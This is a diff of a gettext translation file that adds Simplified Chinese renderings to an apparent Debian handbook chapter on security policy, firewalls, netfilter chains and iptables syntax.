@@ -1,12 +1,12 @@
-#
-# AUTHOR <EMAIL@ADDRESS>, YEAR.
+﻿#
+# wing.W <dabouw@gmail.com>, 2013.
 #
 msgid ""
 msgstr ""
 "Project-Id-Version: 0\n"
 "POT-Creation-Date: 2012-10-31T14:54:18\n"
-"PO-Revision-Date: 2012-05-09T20:00:22\n"
-"Last-Translator: Automatically generated\n"
+"PO-Revision-Date: 2013-05-29T20:00:22\n"
+"Last-Translator: wing.W <dabouw@gmail.com>\n"
 "Language-Team: None\n"
 "Language: \n"
 "MIME-Version: 1.0\n"
@@ -16,542 +16,542 @@ msgstr ""
 #. Tag: keyword
 #, no-c-format
 msgid "Firewall"
-msgstr ""
+msgstr "防火墙"
 
 #. Tag: keyword
 #, no-c-format
 msgid "Netfilter"
-msgstr ""
+msgstr "网络过滤"
 
 #. Tag: keyword
 #, no-c-format
 msgid "IDS/NIDS"
-msgstr ""
+msgstr "IDS/NIDS"
 
 #. Tag: title
 #, no-c-format
 msgid "Security"
-msgstr ""
+msgstr "安全"
 
 #. Tag: para
 #, no-c-format
 msgid "An information system can have a varying level of importance depending on the environment. In some cases, it is vital to a company's survival. It must therefore be protected from various kinds of risks. The process of evaluating these risks, defining and implementing the protection is collectively known as the “security process”."
-msgstr ""
+msgstr "一个信息系统根据其使用环境的不同可能具有不同等级的重要性。某些情况下，对公司性命攸关。因此，必须保护其免受各种风险。评估这些风险，定义并执行保护措施总称为“安全过程”。"
 
 #. Tag: title
 #, no-c-format
 msgid "Defining a Security Policy"
-msgstr ""
+msgstr "定义安全策略"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>CAUTION</emphasis> Scope of this chapter"
-msgstr ""
+msgstr "<emphasis>注意</emphasis> 本章所涉及范围"
 
 #. Tag: para
 #, no-c-format
 msgid "Security is a vast and very sensitive subject, so we cannot claim to describe it in any kind of comprehensive manner in the course of a single chapter. We will only delineate a few important points and describe some of the tools and methods that can be of use in the security domain. For further reading, literature abounds, and entire books have been devoted to the subject. An excellent starting point would be <citetitle>Linux Server Security</citetitle> by Michael D. Bauer (published by O'Reilly)."
-msgstr ""
+msgstr "安全是一个很广泛并且敏感的题目，很难在一个章节的课程中来明确全面地表述。此处只划定几个重点，介绍一些可以用于安全领域的工具和方法。更深层次的读物，作品，书籍比比皆是。一本很好的入门书籍是<citetitle>Linux 服务器安全</citetitle>（<citetitle>Linux Server Security</citetitle> by Michael D. Bauer published by O'Reilly）。"
 
 #. Tag: para
 #, no-c-format
 msgid "The word “security” itself covers a vast range of concepts, tools and procedures, none of which apply universally. Choosing among them requires a precise idea of what your goals are. Securing a system starts with answering a few questions. Rushing headlong into implementing an arbitrary set of tools runs the risk of focusing on the wrong aspects of security."
-msgstr ""
+msgstr "“安全”是一个涵盖很宽泛的概念，工具和方法，没有哪个是万用的。在其中做出选择，需要确切的知道你的目标是什么。保护系统从回答几个问题开始。急匆匆的实施随机的工具会把安全风险转移到错误的方向。"
 
 #. Tag: para
 #, no-c-format
 msgid "The very first thing to determine is therefore the goal. A good approach to help with that determination starts with the following questions:"
-msgstr ""
+msgstr "因此，首要的事情是确定目标。从下面的问题开始，是逐渐确定目标的好方法："
 
 #. Tag: para
 #, no-c-format
 msgid "<emphasis>What</emphasis> are we trying to protect? The security policy will be different depending on whether we want to protect computers or data. In the latter case, we also need to know which data."
-msgstr ""
+msgstr "<emphasis>什么</emphasis> 是要保护的？要保护计算机还是要保护数据，其策略是不同的。如果是后者，还要知道保护哪些数据。"
 
 #. Tag: para
 #, no-c-format
 msgid "What are we trying to protect <emphasis>against</emphasis>? Is it leakage of confidential data? Accidental data loss? Revenue loss caused by disruption of service?"
-msgstr ""
+msgstr "我们试图<emphasis>防止</emphasis>什么？机密数据泄露？意外数据丢失？服务中断而导致的收入损失？"
 
 #. Tag: para
 #, no-c-format
 msgid "Also, <emphasis>who</emphasis> are we trying to protect against? Security measures will be quite different for guarding against a typo by a regular user of the system than they would be when protecting against a determined attacker group."
-msgstr ""
+msgstr "同样，试图防止<emphasis>谁</emphasis>？防范正常用户的输入和防止有预谋的攻击者，其安全措施是大不相同的。"
 
 #. Tag: para
 #, no-c-format
 msgid "The term “risk” is customarily used to refer collectively to these three factors: what to protect, what needs to be prevented from happening, and who will try to make it happen. Modeling the risk requires answers to these three questions. From this risk model, a security policy can be constructed, and the policy can be implemented with concrete actions."
-msgstr ""
+msgstr "术语“风险”通常用来涉及这三个因素的综合：保护什么，防止发生什么，谁会让它发生。三个问题的答案就塑造了风险。针对这种风险模型，就可以构建安全策略，并通过具体行动实施策略。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>NOTE</emphasis> Permanent questioning"
-msgstr ""
+msgstr "<emphasis>注意</emphasis> 永久质疑"
 
 #. Tag: para
 #, no-c-format
 msgid "Bruce Schneier, a world expert in security matters (not only computer security) tries to counter one of security's most important myths with a motto: “Security is a process, not a product”. Assets to be protected change in time, and so do threats and the means available to potential attackers. Even if a security policy has initially been perfectly designed and implemented, one should never rest on one's laurels. The risk components evolve, and the response to that risk must evolve accordingly."
-msgstr ""
+msgstr "Bruce Schneier，是一个安全事务（不仅仅是计算机安全）方面的世界级专家，曾将安全最重要神秘的面纱概括为一句箴言：“安全是一个过程，而非产品”。需要保护的东西会随着时间而改变。威胁和对付潜在攻击者的方法也是如此。即使安全策略被完美的设计和实施，也不应该躺在功劳簿上。引入了新的风险组件，则必须引入相应的对策。"
 
 #. Tag: para
 #, no-c-format
 msgid "Extra constraints are also worth taking into account, as they can restrict the range of available policies. How far are we willing to go to secure a system? This question has a major impact on the policy to implement. The answer is too often only defined in terms of monetary costs, but the other elements should also be considered, such as the amount of inconvenience imposed on system users or performance degradation."
-msgstr ""
+msgstr "额外的限制也值得考虑，它们可以限制可用策略的范围。我们想要在多大程度上保护一个系统？这个问题会对实施策略产生重大影响。答案常常仅仅以金钱成本来定义，但是也应该考虑其他因素，例如强加给系统用户的不便或者性能降低程度。"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the risk has been modeled, one can start thinking about designing an actual security policy."
-msgstr ""
+msgstr "一旦风险成型，就可以考虑开始设计实际的风险策略了。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>NOTE</emphasis> Extreme policies"
-msgstr ""
+msgstr "<emphasis>注意</emphasis> 极端策略"
 
 #. Tag: para
 #, no-c-format
 msgid "There are cases where the choice of actions required to secure a system is extremely simple."
-msgstr ""
+msgstr "某些情况下，保护系统所要做的行动是极其简单的。"
 
 #. Tag: para
 #, no-c-format
 msgid "For instance, if the system to be protected only comprises a second-hand computer, the sole use of which is to add a few numbers at the end of the day, deciding not to do anything special to protect it would be quite reasonable. The intrinsic value of the system is low. The value of the data is zero since they are not stored on the computer. A potential attacker infiltrating this “system” would only gain an unwieldy calculator. The cost of securing such a system would probably be greater than the cost of a breach."
-msgstr ""
+msgstr "譬如，如果要保护的系统只是一个每天结束时加几个数据的二手电脑，那么不采取特殊措施来保护它也是合理的。系统本身的价值很低。而数据不储存在电脑上，数据的价值几乎没有。渗透到该系统的潜在攻击者只会得到一个笨拙的计算器。保护这样一个系统的成本很可能比破坏导致的成本还要大。"
 
 #. Tag: para
 #, no-c-format
 msgid "At the other end of the spectrum, we might want to protect the confidentiality of secret data in the most comprehensive way possible, trumping any other consideration. In this case, an appropriate response would be the total destruction of these data (securely erasing the files, shredding of the hard disks to bits, then dissolving these bits in acid, and so on). If there is an additional requirement that data must be kept in store for future use (although not necessarily readily available), and if cost still isn't a factor, then a starting point would be storing the data on iridium–platinum alloy plates stored in bomb-proof bunkers under various mountains in the world, each of which being (of course) both entirely secret and guarded by entire armies…"
-msgstr ""
+msgstr "另一方面，我们想最充分的保护机密数据，超过其他任何考虑。这种情况，一种恰当的做法可能是完全焚毁这些数据（安全删除文件，将硬盘粉碎成位元，然后将这些位元溶解到酸中，等等）。如果有额外的需求，数据必须存储以便将来使用（虽然不是马上可用），同时要考虑成本因素，那么可以将这些数据存储在白金合金板上，再存到世界山脉下面的防弹沙坑里，每一个都保密并且有重兵把守…"
 
 #. Tag: para
 #, no-c-format
 msgid "Extreme though these examples may seem, they would nevertheless be an adequate response to defined risks, insofar as they are the outcome of a thought process that takes into account the goals to reach and the constraints to fulfill. When coming from a reasoned decision, no security policy is less respectable than any other."
-msgstr ""
+msgstr "虽然看起来有些极端，但是它们足以应对所定义的风险，因为它们是在考虑了要达到的目标和约束条件之后思考的结果。只要是出于理性的决断，没有哪个安全策略比另外的更不值得敬畏。"
 
 #. Tag: para
 #, no-c-format
 msgid "In most cases, the information system can be segmented in consistent and mostly independent subsets. Each subsystem will have its own requirements and constraints, and so the risk assessment and the design of the security policy should be undertaken separately for each. A good principle to keep in mind is that a short and well-defined perimeter is easier to defend than a long and winding frontier. The network organization should also be designed accordingly: the sensitive services should be concentrated on a small number of machines, and these machines should only be accessible via a minimal number of check-points; securing these check-points will be easier than securing all the sensitive machines against the entirety of the outside world. It is at this point that the usefulness of network filtering (including by firewalls) becomes apparent. This filtering can be implemented with dedicated hardware, but a possibly simpler and more flexible solution is to use a software firewall such as the one integrated in the Linux kernel."
-msgstr ""
+msgstr "多数情况下，信息系统可以分割成一致独立的子系统。每个子系统有自身的需求和限制，这样可以单独评估每个风险和设计安全策略。一个需要谨记的原则是简短明晰的周界要比漫长而曲折的前沿容易定义。网络结构也应相应设计：敏感服务应集中在少数几个机器上，而且这些机器只能通过极少数检查点访问；保护这些检查点要比隔离所有敏感机器与外部世界简单。在这些点上，网络过滤器（包括防火墙）的作用就显而易见了。过滤器可以用专门的硬件，但是更为简单和复杂的解决方案是使用软件防火墙，例如在 Linux 内核中集成的。"
 
 #. Tag: title
 #, no-c-format
 msgid "Firewall or Packet Filtering"
-msgstr ""
+msgstr "防火墙或者包过滤"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>firewall</primary>"
-msgstr ""
+msgstr "<primary>防火墙</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>packet filter</primary>"
-msgstr ""
+msgstr "<primary>包过滤</primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>BACK TO BASICS</emphasis> Firewall"
-msgstr ""
+msgstr "<emphasis>回到基础</emphasis> 防火墙"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>packet</primary><secondary>IP</secondary>"
-msgstr ""
+msgstr "<primary>包</primary><secondary>IP</secondary>"
 
 #. Tag: para
 #, no-c-format
 msgid "A <emphasis>firewall</emphasis> is a piece of computer equipment with hardware and/or software that sorts the incoming or outgoing network packets (coming to or from a local network) and only lets through those matching certain predefined conditions."
-msgstr ""
+msgstr "<emphasis>防火墙</emphasis>是计算机设备的一部分，该设备使用硬件和（或者）软件分拣流入和流出的网络数据包（源自或者源于局域网），并且只允许符合预定义条件的包通过。 "
 
 #. Tag: para
 #, no-c-format
 msgid "A firewall is a filtering network gateway and is only effective on packets that must go through it. Therefore, it can only be effective when going through the firewall is the only route for these packets."
-msgstr ""
+msgstr "防火墙是一个过滤网关，并且只对要通过它的数据包有作用。因此，只有在防火墙是这些数据包的唯一路由器的时候才有效。"
 
 #. Tag: para
 #, no-c-format
 msgid "The lack of a standard configuration (and the “process, not product” motto) explains the lack of a turn-key solution. There are, however, tools that make it simpler to configure the <emphasis>netfilter</emphasis> firewall, with a graphical representation of the filtering rules. <command>fwbuilder</command> is undoubtedly among the best of them."
-msgstr ""
+msgstr "缺乏标准配置（之前“过程，而非产品”的格言）就缺少交钥匙解决方案。然而，有些工具使配置 <emphasis>netfilter</emphasis> 防火墙更加简单，使用图形显示过滤规则。<command>fwbuilder</command> 无疑是其中的佼佼者。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis>netfilter</emphasis></primary>"
-msgstr ""
+msgstr "<primary><emphasis>netfilter</emphasis></primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>SPECIFIC CASE</emphasis> Local Firewall"
-msgstr ""
+msgstr "<emphasis>特例</emphasis> 局部防火墙"
 
 #. Tag: para
 #, no-c-format
 msgid "A firewall can be restricted to one particular machine (as opposed to a complete network), in which case its role is to filter or limit access to some services, or possibly to prevent outgoing connections by rogue software that a user could, willingly or not, have installed."
-msgstr ""
+msgstr "防火墙可以应用在个别机器上（相对于整个网络而言），在这些情况中其角色是过滤或限制对一些服务的访问，或阻止用户有意或无意安装的流氓软件对外部的连接。"
 
 #. Tag: para
 #, no-c-format
 msgid "The Linux 2.6 kernel embeds the <emphasis>netfilter</emphasis> firewall. It can be controlled from user-space with the <command>iptables</command> and <command>ip6tables</command> commands. The difference between these two commands is that the former acts on the IPv4 network, whereas the latter acts on IPv6. Since both network protocol stacks will probably be around for many years, both tools will need to be used in parallel."
-msgstr ""
+msgstr "Linux 2.6 内核嵌入了 <emphasis>netfilter</emphasis> 防火墙。可以使用用户空间的 <command>iptables</command> 和 <command>ip6tables</command> 命令控制。这两个命令直接的区别在于前者作用在 IPv4 网络，而后者作用在 IPv6。由于两种网络协议可能在多年内共存，这就需要同时使用两个工具。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>iptables</command></primary>"
-msgstr ""
+msgstr "<primary><command>iptables</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>ip6tables</command></primary>"
-msgstr ""
+msgstr "<primary><command>ip6tables</command></primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "Netfilter Behavior"
-msgstr ""
+msgstr "Netfilter 行为"
 
 #. Tag: para
 #, no-c-format
 msgid "<emphasis>netfilter</emphasis> uses four distinct tables which store rules regulating three kinds of operations on packets:"
-msgstr ""
+msgstr "<emphasis>netfilter</emphasis> 使用四个截然不同的表存储规则，来规定对数据包的三种操作："
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>filter</literal> concerns filtering rules (accepting, refusing or ignoring a packet);"
-msgstr ""
+msgstr "<literal>filter</literal> 关注过滤规则（接受，拒绝或者忽略数据包）；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>nat</literal> concerns translation of source or destination addresses and ports of packages; note that this table only exists for IPv4;"
-msgstr ""
+msgstr "<literal>nat</literal> 关注转化源地址或者目的地址和数据包端口；注意该表只在 IPv4 中存在；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>mangle</literal> concerns other changes to the IP packets (including the ToS — <emphasis>Type of Service</emphasis> — field and options);"
-msgstr ""
+msgstr "<literal>mangle</literal> 关注对 IP 数据包的其他变化（包含 ToS － <emphasis>服务类型</emphasis> －区段和选项）；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>raw</literal> allows other manual modifications on packets before they reach the connection tracking system."
-msgstr ""
+msgstr "<literal>raw</literal> 允许在到达追踪系统之前手动更改数据包。"
 
 #. Tag: para
 #, no-c-format
 msgid "Each table contains lists of rules called <emphasis>chains</emphasis>. The firewall uses standard chains to handle packets based on predefined circumstances. The administrator can create other chains, which will only be used when referred to by one of the standard chains (either directly or indirectly)."
-msgstr ""
+msgstr "每个表都包含称为<emphasis>链（chains）</emphasis>的规则列表。防火墙使用标准链处理预定义环境下的数据包。管理员可以创建其他链，该链只有在被标准链引用（直接或间接）时才会起作用。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>chain</primary>"
-msgstr ""
+msgstr "<primary>链（chain）</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>filtering rule</primary>"
-msgstr ""
+msgstr "<primary>过滤规则</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>filter</literal> table has three standard chains:"
-msgstr ""
+msgstr "<literal>过滤</literal> 表有三个标准链："
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>INPUT</literal>: concerns packets whose destination is the firewall itself;"
-msgstr ""
+msgstr "<literal>输入</literal>：关注目的地是防火墙自身的数据包；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>OUTPUT</literal>: concerns packets emitted by the firewall;"
-msgstr ""
+msgstr "<literal>输出</literal>：关注防火墙发出的数据包；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>FORWARD</literal>: concerns packets transiting through the firewall (which is neither their source nor their destination)."
-msgstr ""
+msgstr "<literal>转发</literal>：关注通过防火墙的数据包（既不是源头也不是目的地）。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>nat</literal> table also has three standard chains:"
-msgstr ""
+msgstr "<literal>nat</literal> 表也有三个标准链："
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>PREROUTING</literal>: to modify packets as soon as they arrive;"
-msgstr ""
+msgstr "<literal>预先路由</literal>：一旦数据包到达就修改；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>POSTROUTING</literal>: to modify packets when they are ready to go on their way;"
-msgstr ""
+msgstr "<literal>后路由</literal>：在准备继续上路时修改数据包；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>OUTPUT</literal>: to modify packets generated by the firewall itself."
-msgstr ""
+msgstr "<literal>输出</literal>：修改防火墙自身产生的数据包。"
 
 #. Tag: title
 #, no-c-format
 msgid "How <emphasis>netfilter</emphasis> chains are called"
-msgstr ""
+msgstr "<emphasis>netfilter</emphasis> 中的链是如何被调用的"
 
 #. Tag: para
 #, no-c-format
 msgid "Each chain is a list of rules; each rule is a set of conditions and an action to execute when the conditions are met. When processing a packet, the firewall scans the appropriate chain, one rule after another; when the conditions for one rule are met, it “jumps” (hence the <literal>-j</literal> option in the commands) to the specified action to continue processing. The most common behaviors are standardized, and dedicated actions exist for them. Taking one of these standard actions interrupts the processing of the chain, since the packet's fate is already sealed (barring an exception mentioned below):"
-msgstr ""
+msgstr "每个链是一个规则列表；每个规则是条件集合以及符合条件时要采取的行动。当处理数据包时，防火墙逐一扫描链；当碰到规则条件时，“跳（jumps）”到（因此在命令中使用 <literal>-j</literal> 选项）规定的行为并继续处理。大多数常用的行为都已经标准化，并有专门操作。使用标准操作会中断对链的处理过程，此时数据包的去向未知（除了下面提到的例外）："
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>BACK TO BASICS</emphasis> ICMP"
-msgstr ""
+msgstr "<emphasis>回到基础</emphasis> ICMP"
 
 #. Tag: para
 #, no-c-format
 msgid "ICMP (<emphasis>Internet Control Message </emphasis>Protocol) is the protocol used to transmit complementary information on communications. It allows testing network connectivity with the <command>ping</command> command (which sends an ICMP <emphasis>echo request</emphasis> message, which the recipient is meant to answer with an ICMP <emphasis>echo reply</emphasis> message). It signals a firewall rejecting a packet, indicates an overflow in a receive buffer, proposes a better route for the next packets in the connection, and so on. This protocol is defined by several RFC documents; the initial RFC777 and RFC792 were soon completed and extended. <ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc777.html\" /><ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc792.html\" />"
-msgstr ""
+msgstr "ICMP （<emphasis>互联网控制信息Internet Control Message </emphasis> 协议）是用来在通信中传递补充信息的协议。支持使用 <command>ping</command> 命令来测试网络的连通性（发送 ICMP <emphasis>回应请求</emphasis>信息，接收者要用 ICMP<emphasis>回应应答</emphasis>信息应答）。它会产生防火墙拒绝数据包，显示接收缓冲区溢出，为连接中后续数据包提供更好的路由，等等。该协议有几个 RFC 文档定义；起先 RFC777 和 RFC792 很快就完成了，并被扩展。 <ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc777.html\" /><ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc792.html\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "For reference, a receive buffer is a small memory zone storing data between the time it arrives from the network and the time the kernel handles it. If this zone is full, new data cannot be received, and ICMP signals the problem, so that the emitter can slow down its transfer rate (which should ideally reach an equilibrium after some time)."
-msgstr ""
+msgstr "接收缓冲区是一个小内存区域，用来存储已经从网络到达而内核还未来得及处理的数据。如果该区域满了，新的数据就不能被接收，ICMP 会发出错误信号，这样发送者会减缓传输速率（理想情况下，过段时间就会达到平衡）。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>ICMP</primary>"
-msgstr ""
+msgstr "<primary>ICMP</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>Internet Control Message Protocol</primary>"
-msgstr ""
+msgstr "<primary>互联网控制信息协议（Internet Control Message Protocol）</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>receive buffer</primary>"
-msgstr ""
+msgstr "<primary>接收缓冲区</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>buffer</primary><secondary>receive buffer</secondary>"
-msgstr ""
+msgstr "<primary>缓冲区</primary><secondary>接收缓冲区</secondary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>ping</command></primary>"
-msgstr ""
+msgstr "<primary><command>ping</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "Note that although an IPv4 network can work without ICMP, ICMPv6 is strictly required for an IPv6 network, since it combines several functions that were, in the IPv4 world, spread across ICMPv4, IGMP (<emphasis>Internet Group Membership Protocol</emphasis>) and ARP (<emphasis>Address Resolution Protocol</emphasis>). ICMPv6 is defined in RFC4443. <ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc4443.html\" />"
-msgstr ""
+msgstr "注意，虽然 IPv4 在没有 ICMP 的情况下，仍然能工作；但是，ICMPv6 对于 IPv6 来说是必须的。因为它结合了一些，在 IPv4 的世界中，遍布 ICMPv4 功能，IGMP（<emphasis>Internet Group Membership Protocol</emphasis>）和 ARP（<emphasis>Address Resolution Protocol</emphasis>）。 ICMPv6 在 RFC4443 中定义。<ulink type=\"block\" url=\"http://www.faqs.org/rfcs/rfc4443.html\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>ACCEPT</literal>: allow the packet to go on its way;"
-msgstr ""
+msgstr "<literal>接受（ACCEPT）</literal>：允许数据包继续往下走；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>REJECT</literal>: reject the packet with an ICMP error packet (the <literal>--reject-with <replaceable>type</replaceable></literal> option to <command>iptables</command> allows selecting the type of error);"
-msgstr ""
+msgstr "<literal>拒绝（REJECT）</literal>：通过 ICMP 错误数据包拒绝（命令 <command>iptables</command> 的<literal>--reject-with <replaceable>type</replaceable></literal> 选项可以设定错误类型）；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>DROP</literal>: delete (ignore) the packet;"
-msgstr ""
+msgstr "<literal>丢弃（DROP）</literal>：删除（忽略）数据包；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>LOG</literal>: log (via <command>syslogd</command>) a message with a description of the packet; note that this action does not interrupt processing, and the execution of the chain continues at the next rule, which is why logging refused packets requires both a LOG and a REJECT/DROP rule;"
-msgstr ""
+msgstr "<literal>记录（LOG）</literal>：记录（通过 <command>syslogd</command>）描述数据包的信息；注意该行为不会中断处理，并且会继续执行链中断的下一条规则，这就为什么记录拒绝数据包既需要记录规则，也需要拒绝／丢弃规则；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>ULOG</literal>: log a message via <command>ulogd</command>, which can be better adapted and more efficient than <command>syslogd</command> for handling large numbers of messages; note that this action, like LOG, also returns processing to the next rule in the calling chain;"
-msgstr ""
+msgstr "<literal>ULOG</literal>：通过 <command>ulogd</command> 记录信息，在处理大量信息时，它比 <command>syslogd</command> 更合适有效；注意该规则，类似 LOG，也会返回到调用链的下一条规则；"
 
 #. Tag: para
 #, no-c-format
 msgid "<replaceable>chain_name</replaceable>: jump to the given chain and evaluate its rules;"
-msgstr ""
+msgstr "<replaceable>链名（chain_name）</replaceable>：跳转到指定链并处理其规则；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>RETURN</literal>: interrupt processing of the current chain, and return to the calling chain; in case the current chain is a standard one, there's no calling chain, so the default action (defined with the <literal>-P</literal> option to <command>iptables</command>) is executed instead;"
-msgstr ""
+msgstr "<literal>返回</literal>：中断当前链的处理过程，并返回调用链；如果当前链是一个标准链，并且没有调用链，默认（有<command>iptables</command>中 <literal>-P</literal> 定义）就会执行该链。"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>SNAT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4): apply <emphasis>Source NAT</emphasis> (extra options describe the exact changes to apply);"
-msgstr ""
+msgstr "<literal>SNAT</literal>（仅存在于 <literal>nat</literal> 表中，即只在 IPv4 中）：申请<emphasis>源 NAT</emphasis>（额外选项描述申请改变）；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>DNAT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4): apply <emphasis>Destination NAT</emphasis> (extra options describe the exact changes to apply);"
-msgstr ""
+msgstr "<literal>DNAT</literal>（仅存在于 <literal>nat</literal> 表中，即只在 IPv4 中）：申请 <emphasis>目的地 NAT</emphasis>（额外选项描述申请改变）；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>MASQUERADE</literal> (only in the <literal>nat</literal> table, therefore only in IPv4): apply <emphasis>masquerading</emphasis> (a special case of <emphasis>Source NAT</emphasis>);"
-msgstr ""
+msgstr "<literal>MASQUERADE</literal>（仅存在于 <literal>nat</literal> 表中，即只在 IPv4 中）：申请 <emphasis>伪装</emphasis>（ <emphasis>源 NAT</emphasis>的一个特例）；"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>REDIRECT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4): redirect a packet to a given port of the firewall itself; this can be used to set up a transparent web proxy that works with no configuration on the client side, since the client thinks it connects to the recipient whereas the communications actually go through the proxy."
-msgstr ""
+msgstr "<literal>重定向（REDIRECT）</literal>（仅存在于 <literal>nat</literal> 表中，即只在 IPv4 中）：将数据包重定向到防火墙的指定端口；它可以用来设置透明网络代理，而不需要在客户端进行配置，客户端认为它在连接至接受者，而实际上它是通过代理通信。"
 
 #. Tag: para
 #, no-c-format
 msgid "Other actions, particularly those concerning the <literal>mangle</literal> table, are outside the scope of this text. The <citerefentry><refentrytitle>iptables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> and <citerefentry><refentrytitle>ip6tables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> have a comprehensive list."
-msgstr ""
+msgstr "其他规则，特别是和 <literal>mangle</literal> 表相关的，不在本章的范围。 <citerefentry><refentrytitle>iptables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> 和 <citerefentry><refentrytitle>ip6tables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> 有全面的清单介绍。"
 
 #. Tag: title
 #, no-c-format
 msgid "Syntax of <command>iptables</command> and <command>ip6tables</command>"
-msgstr ""
+msgstr "<command>iptables</command> 和 <command>ip6tables</command>语法"
 
 #. Tag: para
 #, no-c-format
 msgid "The <command>iptables</command> and <command>ip6tables</command> commands allow manipulating tables, chains and rules. Their <literal>-t <replaceable>table</replaceable></literal> option indicates which table to operate on (by default, <literal>filter</literal>)."
-msgstr ""
+msgstr "<command>iptables</command> 和 <command>ip6tables</command> 命令允许操作表格，链和规则。<literal>-t <replaceable>table</replaceable></literal> 选项指明要操作哪个表（默认，<literal>filter</literal>）。"
 
 #. Tag: title
 #, no-c-format
 msgid "Commands"
-msgstr ""
+msgstr "命令"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>-N <replaceable>chain</replaceable></literal> option creates a new chain. The <literal>-X <replaceable>chain</replaceable></literal> deletes an empty and unused chain. The <literal>-A <replaceable>chain</replaceable><replaceable>rule</replaceable></literal> adds a rule at the end of the given chain. The <literal>-I <replaceable>chain</replaceable> <replaceable>rule_num</replaceable><replaceable>rule</replaceable></literal> option inserts a rule before the rule number <replaceable>rule_num</replaceable>. The <literal>-D <replaceable>chain</replaceable><replaceable>rule_num</replaceable></literal> (or <literal>-D <replaceable>chain</replaceable><replaceable>rule</replaceable></literal>) option deletes a rule in a chain; the first syntax identifies the rule to be deleted by its number, while the latter identifies it by its contents. The <literal>-F <replaceable>chain</replaceable></literal> option flushes a chain (deletes all its rules); if no chain is mentioned, all the rules in the table are deleted. The <literal>-L <replaceable>chain</replaceable></literal> option lists the rules in the chain. Finally, the <literal>-P <replaceable>chain</replaceable><replaceable>action</replaceable></literal> option defines the default action, or “policy”, for a given chain; note that only standard chains can have such a policy."
-msgstr ""
+msgstr "<literal>-N <replaceable>chain</replaceable></literal> 选项创建一个新链。<literal>-X <replaceable>chain</replaceable></literal> 删除不使用的空链。<literal>-A <replaceable>chain</replaceable><replaceable>rule</replaceable></literal> 在指定链的末尾添加规则。<literal>-I <replaceable>chain</replaceable> <replaceable>rule_num</replaceable><replaceable>rule</replaceable></literal> 选项在规则 <replaceable>rule_num</replaceable> 前插入一条规则。<literal>-D <replaceable>chain</replaceable><replaceable>rule_num</replaceable></literal>（或者<literal>-D <replaceable>chain</replaceable><replaceable>rule</replaceable></literal>）选项用来删除链中的一条规则；第一个语法根据号码指明要删除的规则，后者通过内容。<literal>-F <replaceable>chain</replaceable></literal> 选项冲掉一个链（删除所有规则）；如果没有指明规则，则删除表中的所有规则。<literal>-L <replaceable>chain</replaceable></literal> 选项列出表中的规则。<literal>-P <replaceable>chain</replaceable><replaceable>action</replaceable></literal> 选项对指定的链定义默认操作，或“策略”；注意只有标准链可以设置该规则。"
 
 #. Tag: title
 #, no-c-format
 msgid "Rules"
-msgstr ""
+msgstr "规则"
 
 #. Tag: para
 #, no-c-format
 msgid "Each rule is expressed as <literal><replaceable>conditions</replaceable> -j <replaceable>action</replaceable><replaceable>action_options</replaceable></literal>. If several conditions are described in the same rule, then the criterion is the conjunction (logical <emphasis>and</emphasis>) of the conditions, which is at least as restrictive as each individual condition."
-msgstr ""
